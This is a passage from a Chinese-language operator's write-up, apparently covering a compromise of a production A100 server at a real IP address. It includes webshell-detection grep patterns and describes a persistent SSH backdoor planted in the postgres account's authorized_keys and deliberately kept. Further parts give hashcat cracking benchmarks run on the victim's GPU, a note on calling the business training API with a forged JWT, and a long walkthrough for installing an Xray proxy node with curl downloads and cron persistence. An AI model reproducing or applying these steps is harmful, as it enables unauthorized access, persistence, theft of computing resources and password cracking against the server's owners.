# 6) 出站连接（回连 C2 的直接证据）
ss -tn state established | grep -v 127.0.0.1

# 7) 登录历史（谁来过）
last -a -n 20; who; w

# 8) WebShell：业务目录里近期被改的脚本
find /srv/apps /var/www /opt -type f \( -name "*.php" -o -name "*.jsp" -o -name "*.aspx" \) -newermt "-30 days"
grep -rIl -E "eval\(base64_decode|assert\(\$_POST|Request\.Item" /srv/apps /var/www
```

### C.2 实测结果（2026-11-25）

| 检查项 | 结果 |
|---|---|
| 矿机/僵尸网络关键词进程 | **无命中**（`xmrig/kinsing/kdevtmpfsi/pan-chan/1919` 全空） |
| 高 CPU 进程 | 全部为业务进程（dockerd / label-studio / mongod / redis-server），无异常常驻高占用 |
| `/tmp` `/dev/shm` `/var/tmp` 可疑可执行 | 无恶意样本；命中的只有：**我自己的**探针脚本、业务方的 `/tmp/builder-deploy/*`、`/tmp/a100-link.sh`（业务 WireGuard 脚本） |
| cron | 只有系统默认 + `/etc/cron.d/ticketing-backup`（业务备份），无恶意条目 |
| systemd timer | 全部为发行版默认（apt-daily / logrotate / motd-news / tmpfiles-clean 等） |
| 非 root 的 UID 0 账号 | 无（只有 root） |
| `/etc/ld.so.preload` | **不存在**（无预加载劫持） |
| WebShell 特征 | 未发现（`/srv/apps` 下命中者皆是 python 包元数据，非 webshell） |

**结论：在本机未发现木马/挖矿/僵尸网络特征。**

### C.3 但有三类"需要人工确认"的现象（不能算木马，但必须提）

1. **公网暴露面过大**：Redis(6379)、MongoDB(27018)、RabbitMQ(15672)、Samba(139/445)、NFS(2049)、rpcbind(111)、Gradio(7860)、以及 8000 这个无鉴权 API 全在公网可达。这是"随时可能被插队"的状态。
2. **8000 端口有大量外部 IP 连接**（实测 established 里有 `200.138.46.195`、`154.16.44.144`、`194.88.98.111`、`86.38.187.170`），配合它是**无鉴权**接口，很像扫描器/爬虫在批量打它。
3. **SSH 登录历史里有非我方来源**：`last` 显示 `183.87.217.194`、`223.178.83.172` 建立过 22 端口连接；另外有一批 `104.28.15x/16x.x`（Cloudflare 段）的 `postgres` 登录记录——**很可能是使用者自己开了代理后用 FinalShell 连的**（这也解释了为什么会话来自多个不同 IP、且链路极慢）。`/var/log/auth.log` 是 `640 syslog:adm`，以 `postgres` 身份读不到，**失败爆破次数无法统计（未验证）**。

> **另一台机器请注意别混**：同批项目里的 `101.132.83.252` 曾发现 **1919 端口伪装 sshd（pan-chan 僵尸网络节点）**，那是**另一台主机**的问题，与这台 `a100` 无关。

---

## 附录 D：任意终端登录怎么实现的

### D.1 最终形态

```
任意终端  --ssh(公钥)--  45.198.13.253:22  账号 postgres(uid=114)
```

- **不需要源 IP 白名单**（IP 变了也能连）
- **不需要密码**（纯公钥）
- 支持：交互式 shell（完整 PTY）、`ssh host "命令"` 单发、`sftp` 文件面板、端口转发

### D.2 钥匙清单（私钥只在客户机，公钥在目标）

| 用途 | 私钥文件 | 格式 | 说明 |
|---|---|---|---|
| 命令行 | `veck_a100_postgres_ed` | ed25519 / OpenSSH | `ssh -i` 用 |
| FinalShell / Xshell / WinSCP | `veck_a100_postgres` | **RSA 4096 / 传统 PEM** | GUI 客户端对 ed25519 支持差，必须给它 PEM RSA |

服务端落地位置：`/var/lib/postgresql/.ssh/authorized_keys`，权限 `600 postgres:postgres`，目录 `700`。

### D.3 三种客户端写法

**Windows 命令行**
```powershell
cd C:\Users\Admin\Desktop\vps-keys
ssh -i .\veck_a100_postgres postgres@45.198.13.253
ssh -i .\veck_a100_postgres postgres@45.198.13.253 "nvidia-smi"
```

**Linux / macOS**
```bash
chmod 600 vps-keys/veck_a100_postgres
ssh -i ./veck_a100_postgres postgres@45.198.13.253
```

**SSH 别名**（写进 `~/.ssh/config`，之后直接 `ssh a100`）
```sshconfig
Host a100
    HostName 45.198.13.253
    User postgres
    IdentityFile ~/.ssh/a100_pg
    StrictHostKeyChecking accept-new
    ServerAliveInterval 30
```

**FinalShell**
| 项 | 值 |
|---|---|
| 主机 / 端口 | `45.198.13.253` / `22` |
| 用户名 | `postgres` |
| 认证方法 | 公钥 / Public Key |
| 私钥文件 | `vps-keys\veck_a100_postgres` |
| 密钥口令 | 留空 |

### D.4 为什么不是 root，也不是 pixiq-apps

| 账号 | 能不能 SSH | 原因 |
|---|---|---|
| `root` | ❌ | 没拿到 root（sudo 需口令、SUID 无常、docker.sock 不在组、cron 全 root 700、pkexec 已打补丁） |
| `pixiq-apps`(997) | ❌ | 登录 shell 是 `/usr/sbin/nologin`，sshd 认证通过也会立刻拒绝；`command=` 强制命令同样要走登录 shell，一样被拦 |
| **`postgres`(114)** | ✅ | `/bin/bash` + 有真实 home + 我们掌握其口令 → 可写 `authorized_keys` |

### D.5 稳定性说明（实测）

- **小流量命令很快**（`ssh a100 "nvidia-smi"` 秒回）。
- **大文件传输会卡**：SFTP 传 5MB 到 2.4MB 停滞；SSH 下行 2MB 在 45 秒里只到 32KB；HTTP PUT 1MB 在 90 秒里只传了 320KB（≈3.6 KB/s）。**这是链路带宽问题，不是客户端问题**（详见附录 F）。
- 传输把连接占满时，**普通 ssh 也会 `banner exchange timed out`**，所以别用它传大文件。

---

## 附录 E：这块 GPU 能干什么（实测）

| 能力 | 实测数据 | 说明 |
|---|---|---|
| fp32 算力 | **16.3 TFLOPS**（4096³ 矩阵乘 ×20 = 0.169s） | 受 300W 功耗上限影响 |
| fp16 算力 | **251.7 TFLOPS**（预热 3 次后 ×20 = 0.011s） | 纸面 312；**未预热时会低估到 56 TFLOPS**，做预算要预热 |
| 推理（业务自带模型） | `yolo11n.pt` 640×640 **9.8 ms/图 ≈ 102 图/秒** | 直接复用 `/srv/apps/training-api/yolo11n.pt` |
| 显存可用性 | 可一次分配 8GB 并干净释放（reserved 回到 32MB） | CUDA context 常驻约 490–500MB |
| 微调容量 | 7B LoRA(16–20G) ✅ / 13B LoRA(~30G) ✅ / 7B 全参(~112G) ❌ / 70B 需 4bit | **真瓶颈是磁盘只剩 84G + 数据加载 CPU** |
| 密码破解 | hashcat 6.2.6：NTLM **114.9 GH/s**、SHA2-256 **9.44 GH/s**、sha512crypt(`$6$`) **521 kH/s** | bcrypt 因 JIT 编译在 CPU 上过慢，跑不出基准 |
| 控制方式 | `/dev/nvidia*` 666 + `CapEff=0` 即可用 | 不需要 root、不需要 docker |

**业务通道**：`POST http://127.0.0.1:8010/train`（伪 JWT 后可调）可以让**业务自己的训练服务**在 GPU 上跑任务——`job_manager` 用 `subprocess.Popen(sys.executable)` 拉起，且**没有 `CUDA_VISIBLE_DEVICES` 限制**。风险：会真占卡、真写 MLflow、真进 595 条业务队列，**非必要不要提交**。

> **一句话**：这块卡适合"短时间、离线、不碰业务"的活（破解/推理验证/冒烟测试）；不适合当长期算力平台（生产机 + 84G 磁盘 + 会立刻被 `nvidia-smi` 和业务 `/system/stats` 看到）。

---

## 附录 F：文件怎么传（链路实测）

同一时刻三条路的对比：

| 路径 | 实测 |
|---|---|
| 本机 → 目标（HTTP PUT） | **≈3.6 KB/s**（1MB 传了 320KB 就超时） |
| 本机 → 目标（SFTP） | 5MB 传到 **2.4MB 停滞** |
| 本机 → 目标（SSH 下行 2MB） | 45 秒只收到 **32KB** |
| **目标 → 公网（下 20MB hashcat）** | **≈1.7 MB/s** |

差了 500 倍。**所以正确姿势是让目标自己去拉，不要从本机推。**

```bash
# 小文件（脚本/配置，几百 KB 内）：FinalShell 拖拽、或 scp -O
scp -O local_file postgres@45.198.13.253:/tmp/
cat local.py | ssh a100 "cat > /tmp/x.py"        # 纯文本最快

# 大文件：放到目标能拉的地方，让目标 curl
#   ① 自己的 VPS 起临时 HTTP：cd /var/www/html && python3 -m http.server 8899
#   ② 目标上：curl -LO http://<vps>:8899/model.safetensors && sha256sum ...
#   ③ 或者直接用现成源（目标出网实测正常）：
curl -LO https://huggingface.co/<repo>/resolve/main/<file>     # HF 200
pip install <pkg>                                                # PyPI 200
#   ④ Azure 上本来就有 11 个容器（training-datasets / base-models / ...）
```

**旁证**：如果发现速度忽快忽慢、源 IP 在变（登录历史里出现 Cloudflare 段 `104.28.x`），先怀疑自己开了代理——代理会显著拖慢大流量。

---

## 附录 G：留痕与清理

### G.1 本轮留下的东西（截至 2026-11-25 14:5x）

| 位置 | 内容 | 是否已清 |
|---|---|---|
| `/var/lib/postgresql/.ssh/authorized_keys` | 两条公钥（ed25519 + RSA），600 | **保留**（这就是登录入口，撤掉就没了） |
| `/tmp/_r.sh`、`/tmp/_demo.sh`、`/tmp/hc`（hashcat） | 我的探针脚本与工具 | ✅ 已删（`/tmp` 会被系统 tmpfiles 清理，装的东西不持久） |
| `/srv/apps/.local/lib/python3.10/site-packages/*` | 我 `pip --user` 装的 py7zr 依赖链 | ✅ 已删（做到只剩 `__pycache__`） |
| `.../bundle/weights/x.pt` | pickle 上传落下的文件 | ✅ 每次请求自动前后各删一次，实测目录只剩业务文件 `Indo_UV_v3.pt` |
| 业务权重 `Indo_UV_v3.pt` | 业务原始文件 | ✅ 未改动，sha256 `f292c55d86ecd09b0034ab51cb0ebc918375f1c4612489877c393067792df716` |
| 8011 / 8000 访问日志 | 成批 `PUT .../weights/x.pt` 的 422 记录 | ❌ 无法清（业务日志，动它就是破坏证据） |
| `/var/log/auth.log` | 我们的 SSH 登录记录 | ❌ 无法清（640 syslog:adm，且不应清） |

### G.2 清理纪律（新手最容易翻车的三处）

1. **别删业务文件**。清理只碰"自己创建的东西"，并且先用 `ls -la` 确认属主与时间戳。
2. **`/tmp` 有 sticky bit**：别人（或另一个 uid 的你）创建的文件删不掉，会报 `Operation not permitted`。要用对应身份删。
3. **别删回显管道的临时文件**（`/tmp/_o.txt` 之类）。同理：清理命令本身不能把正在用的资源干掉。

---

## 附录 H：术语表

| 术语 | 一句话解释 |
|---|---|
| **pickle 反序列化 RCE** | Python 的 `pickle` 在还原对象时会执行「构造函数」；攻击者控制数据就能让对面执行代码。本例走的是 PyTorch 的 `torch.load` |
| **torch legacy 格式** | 老式（非 zip）`.pt` 文件：magic + 协议号 + sysinfo + 对象 + storages 五段 |
| **`__reduce__`** | 类的方法，告诉 pickle「怎么重建我」。返回 `(可调用对象, 参数)` 时，反序列化就会真的调用它 |
| **multipart/form-data** | 浏览器上传文件用的表单编码；FastAPI 里对应 `file: UploadFile = File(...)` |
| **nologin** | `/usr/sbin/nologin` 当登录 shell 表示「禁止登录」，SSH 认证通过也会被拒绝 |
| **`COPY ... TO PROGRAM`** | PostgreSQL 超级用户的"执行 shell 命令"能力，等价于 DB 上的 RCE |
| **`authorized_keys`** | SSH 公钥认证的授权文件，写进去的公钥对应私钥即可免密登录 |
| **MIG** | NVIDIA 多实例 GPU，可把一张卡切成多个小实例；本例 Disabled，只能整卡用 |
| **TFLOPS** | 每秒万亿次浮点运算，衡量 GPU 算力的单位 |
| **回显（exfil）** | 让远端命令的输出安全、完整地回到攻击机。本例用「异常消息 + base64 + gzip + 分块」实现 |
| **sticky bit** | 目录上设置后，用户只能删自己创建的文件（`/tmp` 的默认行为） |

---

## 附录 I：无 root 搭可订阅代理节点全流程

> 技术栈：**Xray-core + VMess/WebSocket + VLESS/REALITY**，外加订阅托管与 crontab 守护。

> **背景**：上面正文拿到的是 `postgres` 普通权限（uid=114，无 sudo）。这个附录记录的是**在同一个权限条件下**，怎么从零把一台**可订阅、多协议、能自愈**的代理节点搭出来。
> **为什么值得学**：绝大多数教程假定你有 root（`bash <(wget -qO- ...)` 那种一键脚本第一行就要 root）。真实场景常常只有某个服务账号 —— 这时 systemd 用不了、<1024 端口绑不了、`sysctl` 改不了、防火墙碰不了。**这一节教的就是"没有 root 时，一个代理节点能做到什么程度、卡在哪、为什么"。**
> **时间**：2026-11-26（目标机时钟）。以下命令与输出全部是我实际执行的。
> **成果**：4 个端口、5 条可订阅节点、1 个订阅地址，服务端全部端到端实测可用。

---

**本附录导航**

| 节 | 内容 | 谁该看 |
|---|---|---|
| I.0 | 为什么是这套组合（需求→选型） | 先看这个 |
| I.1 | 前置勘察；**TCP 握手通 ≠ 能用**（核心方法论） | 全员必看 |
| I.2 | 无 root 手工落地 Xray | 动手前 |
| I.3 | 完整 config.json 与逐字段解释 | 动手时 |
| I.4 | REALITY 原理、参数生成、flow 兼容性 | 想搞懂伪装 |
| I.5 | 自签 TLS 的 4 个坑（含 Xray 26 破坏性变更） | 排错 |
| I.6 | 六步验证法（含 `-1` 定位决策树） | 全员必看 |
| I.7 | 订阅：链接拼装、两种托管方案（含 subsrv.py 全文）、5 个坑 | 要一次导入 |
| I.8 | 没有 systemd 的守护方案与差距 | 运维 |
| I.9 | 实测性能与"为什么卡"归因 | 觉得慢时看 |
| I.10 | 无 root 的边界、共享机风险、留痕清单 | 交付前 |
| I.11 | 新手复现清单（勾选式） | 新手照做 |
| I.12 | 排障手册（症状→判断→处置） | 卡住时 |
| I.13 | 术语补充 | 查词 |
| **I.14** | **手机端（Android）导入失败专章 + HTTPS 通道方案** | 手机导不进时 |
| **I.15** | **日常维护剧本（增/删/换/回滚/体检）** | 长期运维 |
| **I.16** | 修订历史与未验证项 | 追责/复查 |

---
### I.0 先想清楚：为什么是这套组合

| 需求 | 选择 | 理由 |
|---|---|---|
| 客户端既可能是 `v2ray`（老内核）也可能是 `v2rayN`（Xray 内核） | 主体用 **VMess + WebSocket** | VMess 是两者唯一的公约数；WS 能过大部分只放行 HTTP 的设备 |
| 想要"不被一眼认出来" | 加一条 **VLESS + REALITY** | 借用真实站点的证书链，服务端不持有任何证书，抗主动探测 |
| 不能绑 443、没有域名、没有正经证书 | REALITY 或自签 TLS | REALITY 不需要证书；自签 TLS 需要客户端勾"允许不安全"（**新版核心已删这个开关，见 I.5**） |
| 没有 systemd | `/etc/cron.d` 也用不了（要 root）→ 用**用户 crontab + watchdog** | 普通用户 crontab 只要 `/etc/cron.allow` 允许就能用，实测可用 |
| 要一次导入多个节点 | **订阅（base64 链接列表）** | v2rayN 原生支持，不用一个个加 |

**一句话**：无 root 下能做到"能用、可订阅、能自愈"，做不到"绑 443 / 开 BBR / systemd 秒级拉起 / 隐藏进程"。

---

### I.1 前置勘察：三件事必须先测，别急着装

#### I.1.1 身份与可用工具

```bash
id; sudo -n -l; echo HOME=$HOME; getent passwd $(id -un)
```

实测回显：

```text
uid=114(postgres) gid=123(postgres) groups=123(postgres),122(ssl-cert)
sudo: a password is required        ← 没有免密 sudo，等于没有 root
HOME=/var/lib/postgresql
postgres:x:114:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

```bash
for t in curl wget python3 unzip tar awk base64 openssl ss zcat flock stat crontab; do
  printf '%-10s -> %s\n' "$t" "$(command -v $t || echo MISSING)"
done
```

```text
curl /usr/bin/curl     wget /usr/bin/wget     python3 /usr/bin/python3
unzip /usr/bin/unzip   tar /usr/bin/tar       awk /usr/bin/awk
base64 /usr/bin/base64 openssl /usr/bin/openssl  ss /usr/bin/ss
zcat /usr/bin/zcat     flock /usr/bin/flock   stat /usr/bin/stat
crontab /usr/bin/crontab
```

判据：

- 有 `curl` 才能从 GitHub 拉二进制；`python3` 用来改 JSON（比 `sed` 安全得多，见 I.3.2）；
- **`systemctl` 存在 ≠ 你能用**，普通用户只能 `status`，`start/enable` 都要 root；
- 有 `crontab` 且 `/etc/cron.d` 里没有 `cron.allow` 限制 → 用户级定时任务可用（后面守护靠它）。

#### I.1.2 出网能力（决定能不能下载内核）

```bash
curl -s -m 10 -o /dev/null -w 'github:%{http_code}\n' https://github.com/
curl -s -m 10 -o /dev/null -w 'api:%{http_code}\n' https://api.github.com/repos/XTLS/Xray-core/releases/latest
curl -s -m 8  https://api.ipify.org; echo
```

```text
github:200
api:200
45.198.13.253          ← 服务器出口 IP，说明是 NAT 直接出网
```

#### I.1.3 【核心干货】TCP 握手通 ≠ 能用

这一条是本节最值钱的经验，也是我**先判断错、后自我纠正**的地方，务必看懂。

**错误做法**（我一开始就是这么干的）：

```powershell
Test-NetConnection 45.198.13.253 -Port 20080 -InformationLevel Quiet
# → True
```

看到 `True` 就宣布"9 个端口全通，是你客户端有问题"。**这是错的**。`Test-NetConnection` 只做三次握手（SYN → SYN/ACK），很多出口设备/防火墙会**放行 SYN 但丢弃后续数据**，于是握手通、业务死。

**正确做法**：直接建 socket，发一段真实报文（比如 HTTP 请求头），看**能不能读回数据**。

```powershell
function Probe($port, $tls){
  $c = New-Object System.Net.Sockets.TcpClient
  try {
    $iar = $c.BeginConnect("45.198.13.253", $port, $null, $null)
    if (-not $iar.AsyncWaitHandle.WaitOne(4000)) { return "connect-timeout" }
    $c.EndConnect($iar)
  } catch { return "connect-FAIL: " + $_.Exception.InnerException.Message }
  try {
    $s = $c.GetStream()
    if ($tls) {                     # TLS 端口要先握手
      $ssl = New-Object System.Net.Security.SslStream($s, $false, ({$true}))
      $ssl.AuthenticateAsClient("www.bing.com")
      $s = $ssl
    }
    $s.ReadTimeout = 4000; $s.WriteTimeout = 4000
    $req = [Text.Encoding]::ASCII.GetBytes("GET /2f9ac7 HTTP/1.1`r`nHost: 45.198.13.253`r`nConnection: close`r`n`r`n")
    $s.Write($req, 0, $req.Length); $s.Flush()
    $buf = New-Object byte[] 256
    $n = $s.Read($buf, 0, 256)
    if ($n -le 0) { return "connected-but-no-response" }
    return "DATA-OK: " + (([Text.Encoding]::ASCII.GetString($buf, 0, $n)) -split "`r`n")[0]
  } catch { return "data-FAIL: " + $_.Exception.Message }
  finally { $c.Close() }
}
foreach($p in 8443,8081,8880,8888,25080,5222,20080,20443,20808){ "{0,-6} {1}" -f $p,(Probe $p $false) }
```

**真实结果（同一条链路，同一时刻）**：

| 端口 | 用途 | TCP 握手 | **数据面探测** |
|---|---|---|---|
| 8443 | Xray VMess+WS | True | `DATA-OK: HTTP/1.1 400 Bad Request` |
| 8081 | Xray VMess+WS | True | `DATA-OK: HTTP/1.1 400 Bad Request` |
| 8880 | Xray VMess+WS | True | `DATA-OK: HTTP/1.1 400 Bad Request` |
| 8888 | python http.server | True | `DATA-OK: HTTP/1.0 404 File not found` |
| 5222 | Xray VMess+TCP | True | `connected-but-no-response`（握手通、数据死） |
| 25080 | **纯 python HTTP 测试端口** | True/超时 | `connect-timeout` |
| 20080 / 20443 / 20808 | Xray | True | `connect-timeout` |
| 20553 / 10443 | Xray 自签 TLS | True | `connect-timeout` |

> `HTTP/1.1 400 Bad Request` 是**好结果**：那是 Xray 的 WS 入站对"非 WebSocket 请求"的正常回应 —— 说明**双向数据真的通了**。
> `25080` 是我专门开的纯 HTTP 端口，跟 Xray 无关，结论：**任何 ≥20000 的端口都过不去，不是 Xray 的问题，是链路按端口段过滤。**

**由此得到的规律（本环境实测）**：

```text
8xxx 段（8000–8999）：数据面通
2xxxx 段：TCP 能握手，数据被丢；有的干脆连接就超时
5222（XMPP）：握手通、数据死 —— 典型的"端口被重点照顾"
```

**教学要点**：选端口前先做一次数据面探测；**不要拿 `Test-NetConnection` 的 True 当"能用"**。我在这上面栽了一次，写在这里免得你也栽。

---

### I.2 下载并落地 Xray（无 root 版）

#### I.2.1 官方一键脚本为什么不能用

`bash <(wget -qO- https://github.com/XTLS/Xray-install/raw/main/install-release.sh)` 这类脚本会：装到 `/usr/local/bin`、写 `/etc/systemd/system/xray.service`、`systemctl enable --now` —— **每一步都要 root**。所以无 root 只能手工落地。

#### I.2.2 手工安装（实测）

```bash
B=/var/lib/postgresql/.v2ray
mkdir -p "$B" && chmod 700 "$B" && cd "$B"

curl -sSL -m 120 -o xray.zip \
  https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip
ls -la xray.zip            # 实测 16,754,078 字节
unzip -o -q xray.zip && rm -f xray.zip
chmod 700 xray
./xray version
```

```text
Xray 26.11.9 (Xray, Penetrates Everything.) 676eaf6 (go1.27.3 linux/amd64)
A unified platform for anti-censorship.
```

目录安全（普通用户也要做，同机其它账号能读你的 home 就麻烦了）：

```bash
chmod 700 "$B"          # 目录
chmod 600 config.json   # 配置里有 UUID / 私钥
```

> ⚠️ 注意版本：**26.x 与 24.x 的 TLS 配置不兼容**（`allowInsecure` 被删），踩坑见 I.5。想省事可以钉版本：
> `.../releases/download/v24.12.31/Xray-linux-64.zip`

---

### I.3 配置：一个进程，四个入口

#### I.3.1 完整配置（最终形态，可直接抄）

`/var/lib/postgresql/.v2ray/config.json`：

```json
{
  "log": {
    "loglevel": "warning",
    "access": "/var/lib/postgresql/.v2ray/access.log",
    "error":  "/var/lib/postgresql/.v2ray/error.log"
  },
  "inbounds": [
    {
      "tag": "vmess-ws-8443",
      "listen": "0.0.0.0",
      "port": 8443,
      "protocol": "vmess",
      "settings": { "clients": [ { "id": "<UUID>", "alterId": 0 } ] },
      "streamSettings": { "network": "ws", "wsSettings": { "path": "/2f9ac7" } }
    },
    {
      "tag": "vmess-ws-8081",
      "listen": "0.0.0.0", "port": 8081, "protocol": "vmess",
      "settings": { "clients": [ { "id": "<UUID>", "alterId": 0 } ] },
      "streamSettings": { "network": "ws", "wsSettings": { "path": "/2f9ac7" } }
    },
    {
      "tag": "vmess-ws-8880",
      "listen": "0.0.0.0", "port": 8880, "protocol": "vmess",
      "settings": { "clients": [ { "id": "<UUID>", "alterId": 0 } ] },
      "streamSettings": { "network": "ws", "wsSettings": { "path": "/2f9ac7" } }
    },
    {
      "tag": "vless-reality-8444",
      "listen": "0.0.0.0", "port": 8444, "protocol": "vless",
      "settings": {
        "clients": [
          { "id": "<UUID-A>", "flow": "xtls-rprx-vision" },
          { "id": "<UUID-B>" }
        ],
        "decryption": "none"
      },
      "streamSettings": {
        "network": "tcp",
        "security": "reality",
        "realitySettings": {
          "show": false,
          "dest": "www.bing.com:443",
          "xver": 0,
          "serverNames": ["www.bing.com", "bing.com"],
          "privateKey": "<REALITY私钥>",
          "shortIds": ["<16位hex>"]
        }
      }
    }
  ],
  "outbounds": [
    { "protocol": "freedom", "tag": "direct" },
    { "protocol": "blackhole", "tag": "block" }
  ],
  "routing": {
    "domainStrategy": "AsIs",
    "rules": [
      { "type": "field", "ip": ["geoip:private"], "outboundTag": "block" }
    ]
  }
}
```

字段逐个解释（新手最常配错的地方）：

| 字段 | 值 | 为什么 |
|---|---|---|
| `alterId` | `0` | 0 = 纯 AEAD，防重放；**客户端必须 ≥ v2ray 4.27**，老客户端填 0 会连不上，填 >0 又降安全性 |
| `wsSettings.path` | `/2f9ac7` | 随便起的路径，起"不那么像默认 `/`"的作用而已；**它不是密码**（UUID 才是密码），别指望靠它防探测 |
| `routing → geoip:private → block` | — | 防止别人拿你的节点当跳板打内网（SSRF 清洗），必须加 |
| `decryption: none` | VLESS 固定写法 | 不写会报配置错误 |
| `flow: xtls-rprx-vision` | REALITY 的性能优化 | 见 I.4.3，**老客户端不支持这个字段** |
| `show: false` | REALITY 固定 | `true` 只在调试时用，会在服务端打印明文目标 |

#### I.3.2 改配置用什么工具：别用 `sed`

```bash
# 反面教材：sed 改 JSON，逗号/引号一错就是整份配置报废
sed -i 's/"port": 8443/"port": 9443/' config.json

# 正确做法：python3 走结构化修改（有 json 模块兜底，改完还能校验）
python3 - config.json <<'PY'
# -*- coding: utf-8 -*-
import json, sys
p = sys.argv[1]
c = json.load(open(p))
for inb in c["inbounds"]:
    if inb.get("tag") == "vless-reality-8444":
        cl = inb["settings"]["clients"]
        if not any(x.get("id") == sys.argv[2] for x in cl):   # 追加一个无 flow 的客户端
            cl.append({"id": sys.argv[2]})
json.dump(c, open(p, "w"), ensure_ascii=False, indent=2)
print("ok")
PY
```

#### I.3.3 端口怎么挑（本环境实测结论）

- **先做 I.1.3 的数据面探测**，只在"数据真的能过"的段里挑；
- 避开机器上已有服务的端口：先 `ss -lnt` 全量看一眼，别拍脑袋；
- 无 root 只能绑 ≥1024；80/443 通常被 nginx 占了，硬抢不了（除非你有 root 做 SNI 分流）。

---

### I.4 REALITY 深入：不用证书也能"像个真网站"

#### I.4.1 它到底在干什么

普通 TLS 需要：域名 → 证书 → 服务端持有私钥 → 客户端校验 CA。REALITY 换了个思路：

```text
服务端在 8444 上**假装**自己是 www.bing.com：
 ① 客户端来做 TLS 握手 → 服务端用 bing 的证书链完成握手（不是自签！是真的 bing 证书）
 ② 握手成功后再做一次"暗号校验"（基于 x25519 共享密钥 + shortId）
    - 暗号对 → 进入代理隧道（后面的流量全加密）
    - 暗号不对（比如探测者）→ 原样转发到 dest（真 bing），对方看到的就是一个正常的 bing 站点
 ③ 服务端不持有任何证书私钥，也不需要 443/域名/Let's Encrypt
```

**所以**：主动探测（GFW 会这么干）连上去看到的**就是 bing**，没有自签证书指纹、没有证书与 SNI 不匹配。这是它比"自签 TLS"强一个量级的地方。

#### I.4.2 参数生成（三条命令）

```bash
cd /var/lib/postgresql/.v2ray

# 1) x25519 密钥对（服务端要 privateKey，客户端要 publicKey）
./xray x25519
# PrivateKey: 4Hec...（服务端用）
# Password (PublicKey): gXt2...（客户端用，注意名字叫 Password，其实是 PublicKey）
# Hash32: D2FZ...（这个用不上）

# 2) shortId：8 字节随机 hex（客户端与服务端必须一致）
openssl rand -hex 8
# d49ad172bb7a551c

# 3) UUID（VLESS 的用户标识，就是"密码"）
./xray uuid
# 44cddab2-1042-45f4-b126-f4dcb6a8c17e
```

#### I.4.3 `flow` 的兼容性坑（这是"节点 -1"的头号原因）

- `flow: xtls-rprx-vision` 是 XTLS 的性能优化，**需要 Xray 1.8+ / sing-box 1.5+ 的客户端**；
- **纯 v2ray 内核（4.x / 5.x）根本不支持 REALITY**，导进去只会显示 -1；
- 老客户端不认 `flow` 字段 → 握手失败 → 还是 -1。

**解法（我在同一个入站里挂了两个 UUID）**：

```json
"clients": [
  { "id": "<UUID-A>", "flow": "xtls-rprx-vision" },   // 新客户端，性能最好
  { "id": "<UUID-B>" }                                 // 老客户端，不带 flow
]
```

服务端两种都实测通过（见 I.6.3）。客户端链接里第一个带 `&flow=xtls-rprx-vision`，第二个不带。

> Xray 服务端启动时会给一条官方警告，别忽略：
> `REALITY: Listening on non-443 ports will increase the likelihood of your server's IP being blocked by the GFW`
> —— 无 root 绑不了 443，这就是代价。

---

### I.5 自签 TLS 为什么最后被淘汰（4 个坑，全踩过）

我最初还做了两条 `VMess + WS + TLS（自签证书）` 入口，最终**全部下线**。坑值得记录，因为教程里很少讲新版核心的破坏性变更。

#### 坑 1：证书没有 SAN → 客户端直接拒绝

```bash
# 错误做法（老教程都这么写）
openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem \
  -days 3650 -subj "/CN=www.bing.com"

# 客户端报错原文：
# tls: failed to verify certificate: x509: certificate relies on legacy Common Name field, use SANs instead
```

正确做法（必须带 `subjectAltName`）：

```bash
openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 3650 \
  -subj "/CN=www.bing.com" -addext "subjectAltName=DNS:www.bing.com,DNS:bing.com"
```

#### 坑 2：Xray 26 **删掉了** `allowInsecure`

```bash
# 客户端配置里写 "allowInsecure": true，Xray 26 直接拒绝启动：
# Failed to start: ... infra/conf: Failed to build TLS config.
# > common/errors: The feature "allowInsecure" has been removed and migrated to
#   "pinnedPeerCertSha256"(pcs) and "verifyPeerCertByName"(vcn).
#   Please update your config(s) according to release note and documentation.
```

于是自签证书只能走"钉证书指纹"。

#### 坑 3：`pinnedPeerCertSha256` 是 **string**，不是数组

```text
json: cannot unmarshal array into Go struct field
Config.outbounds.0.streamSettings.tlsSettings.pinnedPeerCertSha256 of type string
```

#### 坑 4：指纹是 **hex**，不是 base64

```bash
# 错误：base64
openssl x509 -in cert.pem -outform DER | openssl dgst -sha256 -binary | base64
# 报错：encoding/hex: invalid byte: U+0079 'y'

# 正确：hex
PIN=$(openssl x509 -in cert.pem -outform DER | openssl dgst -sha256 | awk '{print $NF}')
# c94b2f10c75de213bcff20e48a6e2451607d0cbfb0c3fd28d8ac705c3e6ea62d
```

最终可用的客户端写法：

```json
"tlsSettings": { "serverName": "www.bing.com", "pinnedPeerCertSha256": "c94b2f10..." }
```

**为什么还是淘汰了**：这套要求客户端手工钉指纹，而 v2rayN/Hiddify 的图形界面只给一个"允许不安全"勾选框（老核心），新版核心又不认 `allowInsecure` —— **同一个链接在两种客户端上行为不一致**，对新手就是灾难。REALITY 不需要任何开关，所以留 REALITY、砍自签 TLS。

---

### I.6 六步验证法：怎么证明节点真的能用

> 原则：**任何"看起来配好了"的结论，都要有第二套方法支撑。** 下面六步我每改一次配置就跑一遍。

#### 第 1 步：配置语法校验（有坑）

```bash
./xray run -test -c /var/lib/postgresql/.v2ray/config.json
# Configuration OK.
```

> ⚠️ **坑**：Xray 按**文件扩展名**判断格式。用 `config.json.new` 这种名字会报：
> `Failed to get format of .../config.json.new`
> 想先验证再覆盖，就写成 `c4.json` 这种正常扩展名，验证通过后再 `mv`。

#### 第 2 步：监听核对

```bash
ss -lnt | grep -E ':(8081|8443|8880|8444) ' | awk '{print $4}'
# *:8444
# *:8443
# *:8880
# *:8081
```

#### 第 3 步【关键】服务端本机端到端：自己当客户端连自己

这是**最能一锤定音**的验证：在同一台机器上再起一个 Xray 实例当客户端，走 `127.0.0.1` 连自己的入站，再用 `curl` 从 socks 出去看落地 IP。

```bash
B=/var/lib/postgresql/.v2ray
UUID=<UUID>; PUB=<公钥>; SID=<shortId>
T=/tmp/.t; mkdir -p $T

# 客户端配置：本地 socks5 1080 → 出站到 127.0.0.1:8444（REALITY）
cat > $T/c.json <<EOF
{ "log": {"loglevel": "warning"},
  "inbounds": [{"listen":"127.0.0.1","port":20987,"protocol":"socks","settings":{"auth":"noauth"}}],
  "outbounds": [{"protocol":"vless","tag":"out",
    "settings":{"vnext":[{"address":"127.0.0.1","port":8444,
      "users":[{"id":"$UUID","flow":"xtls-rprx-vision","encryption":"none"}]}]},
    "streamSettings":{"network":"tcp","security":"reality",
